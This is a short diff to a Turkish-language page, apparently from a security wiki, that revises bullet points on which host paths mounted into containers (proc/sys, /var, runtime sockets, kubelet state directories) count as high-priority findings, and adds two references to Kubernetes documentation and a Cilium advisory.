 - Host root, `/proc`, `/sys`, `/var` ve runtime sockets hepsi yüksek öncelikli bulgulardır.
-- Yazılabilir proc/sys girdileri genellikle mount'un host-genel kernel kontrollerini açığa çıkardığını, güvenli bir container görünümü sağlamadığını gösterir.
-- Mount edilmiş `/var` yolları sadece dosya sistemi incelemesi değil; kimlik bilgileri ve komşu iş yükü incelemesi gerektirir.
+- Yazılabilir proc/sys girdileri çoğu zaman mount’un güvenli bir container görünümü yerine host-genel kernel kontrollerini açığa çıkardığı anlamına gelir.
+- Mount edilmiş `/var` yolları, yalnızca filesystem incelemesi değil, credential ve komşu workload incelemesi de gerektirir.
+- Kubelet state directories ve CNI/plugin yolları, runtime sockets ile aynı önceliğe sahiptir çünkü çoğu zaman doğrudan node’un pod oluşturma ve credential dağıtım yolunun üzerinde yer alırlar.
+
+## References
+
+- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
+- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
 {{#include ../../../banners/hacktricks-training.md}}
